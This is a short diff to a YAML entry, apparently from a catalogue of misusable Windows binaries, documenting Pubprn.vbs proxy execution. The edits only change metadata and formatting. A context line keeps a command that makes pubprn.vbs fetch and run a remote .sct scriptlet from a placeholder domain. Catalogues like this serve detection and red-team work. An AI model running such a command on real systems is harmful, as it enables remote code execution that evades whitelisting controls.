@@ -1,6 +1,6 @@
 Name: Pubprn.vbs
-Description: null
-Author: Oddvar Moe
+Description: Proxy execution with Pubprn.vbs
+Author: 'Oddvar Moe'
 Created: 2018-05-25
 Commands:
 - Command: pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct
@@ -25,5 +25,5 @@ Resources:
 - Link: https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
 - Link: https://github.com/enigma0x3/windows-operating-system-archaeology
 Acknowledgement:
-- Person: Matt Nelson
-  Handle: '@enigma0x3'
+  - Person: Matt Nelson
+    Handle: '@enigma0x3'
